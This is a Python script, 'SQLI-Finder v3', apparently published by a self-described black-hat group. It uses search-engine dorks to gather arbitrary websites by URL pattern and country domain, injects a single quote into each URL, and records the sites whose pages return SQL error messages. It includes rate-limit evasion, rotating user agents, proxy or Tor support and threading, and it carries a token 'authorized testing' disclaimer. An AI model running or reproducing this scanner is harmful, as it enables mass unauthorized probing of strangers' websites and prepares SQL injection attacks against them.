#!/usr/bin/env python3
"""
SQLI-Finder v3 (anti-429)

Improved SQL Injection dork scanner.

Author: gnu23
GitHub: https://github.com/gnu23

DISCLAIMER: Use only for educational or authorized security testing.
"""

import os
import sys
import random
import argparse
import urllib.request
from googlesearch import search
from termcolor import colored
from tqdm import tqdm
import concurrent.futures

# Erros SQL comuns
SQL_ERRORS = [
    "You have an error in your SQL syntax;",
    "mysql_fetch",
    "ORA-01756",
    "ODBC SQL Server Driver",
    "Unclosed quotation mark",
    "Microsoft JET Database",
    "Syntax error",
    "Warning: pg_",
    "supplied argument is not a valid MySQL result resource",
    "java.sql.SQLException",
]

# User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
]

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(colored("""
          ╔═╗╔═╗ ╦  ╦   ╔═╗╦╔╗╔╔╦╗╔═╗╦═╗
          ╚═╗║═╬╗║  ║───╠╣ ║║║║ ║║║╣ ╠╦╝
          ╚═╝╚═╝╚╩═╝╩   ╚  ╩╝╚╝═╩╝╚═╝╩╚═                          
                Made with ❤️ by gnu23
                Lulzsec BlackHat Grupo
            Telegram: https://t.me/lulzsec_blackhat_team
    """, "green"))

def check_site(url, proxy=None, output_file="vuln_sites.txt"):
    try:
        vuln_url = url + "'"
        req = urllib.request.Request(vuln_url)
        req.add_header('User-Agent', random.choice(USER_AGENTS))

        if proxy:
            proxy_handler = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
            opener = urllib.request.build_opener(proxy_handler)
            urllib.request.install_opener(opener)

        resp = urllib.request.urlopen(req, timeout=15)
        body = resp.read().decode('utf-8', errors='ignore')

        if any(error in body for error in SQL_ERRORS):
            print(url + " ===> " + colored("Vulnerable!", 'green'))
            with open(output_file, "a") as f:
                f.write(url + "\n")
        else:
            print(url + " ===> " + colored("Not Vulnerable!", 'red'))

    except Exception as e:
        print(url + " ===> " + colored("Could not be determined", 'blue'))

def fallback_duckduckgo(query, num_results=10):
    """
    Busca fallback simples em DuckDuckGo usando dork (só retorna URLs brutas).
    """
    import requests, re

    print(colored("[*] Trying fallback with DuckDuckGo...", 'yellow'))
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    params = {'q': query, 'kl': 'us-en'}
    response = requests.get("https://html.duckduckgo.com/html/", headers=headers, params=params, timeout=15)

    links = re.findall(r'<a rel="nofollow" class="result__a" href="(.*?)">', response.text)
    return links[:num_results]

def main():
    clear_screen()
    banner()

    parser = argparse.ArgumentParser(description="SQLI-Finder v3 Anti-429 by gnu23")
    parser.add_argument("--dork", required=True, help="SQLi dork (e.g., php?id=, aspx?id=)")
    parser.add_argument("--ext", required=True, help="Website extension (e.g., .com, .br)")
    parser.add_argument("--total", type=int, default=10, help="Number of websites to find")
    parser.add_argument("--page", type=int, default=1, help="Google page number to start from")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--proxy", help="Proxy (e.g., socks5://127.0.0.1:9050)")
    parser.add_argument("--output", default="vuln_sites.txt", help="File to save vulnerable URLs")
    parser.add_argument("--pause", type=int, default=20, help="Pause time between requests (seconds)")

    args = parser.parse_args()

    query = f"inurl:{args.dork} site:{args.ext}"

    print(colored("\n[+] Searching with your dork... Please wait.\n", 'yellow'))

    try:
        results = list(search(query, num=args.total, start=args.page * 10, stop=args.total, pause=args.pause))
    except Exception as e:
        print(colored(f"[!] Google blocked you or error occurred: {e}", 'red'))
        print(colored("[*] Trying fallback DuckDuckGo search...", 'yellow'))
        results = fallback_duckduckgo(query, num_results=args.total)

    if not results:
        print(colored("[!] No results found. Exiting.", 'red'))
        sys.exit(1)

    print(colored("[+] Checking for vulnerabilities...\n", 'yellow'))

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        list(tqdm(executor.map(lambda url: check_site(url, args.proxy, args.output), results), total=len(results), desc="Scanning"))

    print(colored(f"\n[+] Finished! Vulnerable URLs saved in {args.output}\n", 'green'))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] Interrupted by user. Exiting.", 'red'))
        sys.exit(0)
